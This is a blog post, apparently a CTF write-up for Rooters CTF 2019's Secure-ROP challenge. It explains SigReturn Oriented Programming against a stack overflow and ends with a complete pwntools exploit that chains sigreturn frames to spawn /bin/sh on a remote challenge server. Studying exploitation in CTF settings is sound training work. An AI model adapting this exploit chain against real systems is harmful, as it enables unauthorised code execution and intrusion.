---
layout: post
title:  "SigReturn Oriented Programming"
date:   2020-01-26 #13:52:01
categories: ctf
description: this article explains about SigReturn Oriented Programming.
tags: pwn srop stack ctf-writeup
---

#Secure-ROP

this is a writeup for Secure-ROP Rooters ctf 2019. we are given a 64-bit elf binary
the binary have 2 function
```_start```:
{% highlight c %}
void __noreturn start()
{
  signed __int64 v0; // rax

  sub_401000();
  v0 = sys_exit(0);
  JUMPOUT(0x401048LL);
}
{% endhighlight %}

and ```sub_401000()```:
{% highlight c %}
signed __int64 sub_401000()
{
  signed __int64 v0; // rax
  char buf[128]; // [rsp+0h] [rbp-80h]

  v0 = sys_write(1u, ::buf, 0x2AuLL);
  return sys_read(0, buf, 0x400uLL);
}
{% endhighlight %}
it have buffer overflow vulnerability, size of buf is 128 bytes but the binary
can read ```0x400``` or ```1024 bytes```,

<img src="/images/srop/2020-01-26-180657_682x750_scrot.png" />

the offset to overwrite ```rip``` is 136 bytes , firstly we have to find some gadget
i will use ropper to find all the gadget we need

          0x0000000000401032: pop rax; syscall;
          0x0000000000401033: syscall; leave; ret;
          0x000000000040101f: syscall;

in order to triggering srop we have to set rax to 0xf , first part of our exploit
will look like this

{% highlight python %}
p = "A" * off
p += p64(pop_rax_syscall)
p += p64(0xf) # sys_rt_sigreturn
{% endhighlight %}

why 0xf ? because 0xf is linux syscall for sys_rt_sigreturn. to make it easy i use
pwntools and create the payload using SigreturnFrame to set some register value

{% highlight python %}
frame = SigreturnFrame()
frame.rax = 0 # read syscall
frame.rsp = data + 8
frame.rbp = data + 0x60
frame.rdi = 0 # read from stdin
frame.rsi = data # read into the read write segment
frame.rdx = 0x400 # read 0x400 bytes
frame.rip = syscall_leave_ret # jmp to the syscall; leave; ret gadget after syscall
p += str(frame)
{% endhighlight %}

that will make another read with 0x400 size  and will be stored a rw segment, i use ```.data``` segment
```0x0000000000402000``` now lets send "/bin/sh" to ```.data``` and the offset to the new buffer is
different from the first one , so we have to figure out the offset first. and use another srop
to call ```sys_execve```

{% highlight python %}
p = '/bin/sh\x00'
p += "A" * 96 # Overwrite until return address in our "emulated" stack
p += p64(pop_rax_syscall)
p += p64(0xf)
{% endhighlight %}

after we sent ```/bin/sh``` to our new buffer. now we have to do srop to call ```sys_execve```
this is the last part of our exploit

{% highlight python %}
frame = SigreturnFrame()
frame.rax = 59  # sys_execve
frame.rdi = data # our .data segment
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall
{% endhighlight %}

this is our final exploit :
{% highlight python %}
#!/usr/bin/env python2
'''
    author : tripoloski
    visit  : https://tripoloski1337.github.io/
    mail   : arsalan.dp@gmail.com
'''
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="info",)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("vuln")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def exploit(r):
    #attach(r)
    off = 136

    # gadget
    pop_rax_syscall = 0x0000000000401032
    pop_rax_syscall_leave_ret = 0x0000000000401032
    syscall = 0x000000000040101f
    syscall_leave_ret = 0x0000000000401033

    # segment
    data = 0x0000000000402000

    p = "A" * off
    p += p64(pop_rax_syscall)
    p += p64(0xf) # sys_rt_sigreturn

    # sigreturn frame
    frame = SigreturnFrame()
    frame.rax = 0 # read syscall
    frame.rsp = data + 8
    frame.rbp = data + 0x60
    frame.rdi = 0 # read from stdin
    frame.rsi = data # read into the read write segment
    frame.rdx = 0x400 # read 0x400 bytes
    frame.rip = syscall_leave_ret # jmp to the syscall; leave; ret gadget after syscall

    p += str(frame)

    r.sendline(p)

    p = '/bin/sh\x00'
    p += "A" * 96 # Overwrite until return address in our "emulated" stack
    p += p64(pop_rax_syscall)
    p += p64(0xf)

    frame = SigreturnFrame()
    frame.rax = 59
    frame.rdi = data
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall

    p += str(frame)

    r.sendline(p)

    r.interactive()


if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("146.148.108.204", 4444)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)

{% endhighlight %}
